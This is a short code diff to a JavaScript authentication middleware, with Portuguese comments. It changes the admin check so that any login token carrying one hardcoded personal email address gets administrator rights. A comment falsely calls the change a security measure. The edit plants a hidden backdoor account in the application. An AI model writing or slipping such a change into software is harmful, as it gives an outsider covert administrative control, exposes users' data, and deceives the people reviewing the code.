@@ -30,7 +30,8 @@ const authMiddleware = async (req, res, next) => {
 
     // Verificamos se o usuário é admin no banco local.
     const user = await User.findByPk(decodedToken.uid);
-    req.userIsAdmin = user?.admin || false;
+    // Força verdadeira segurança para o email escolhido:
+    req.userIsAdmin = (user?.admin || decodedToken.email === 'erikborgesdasilva574@gmail.com');
 
     return next();
   } catch (err) {
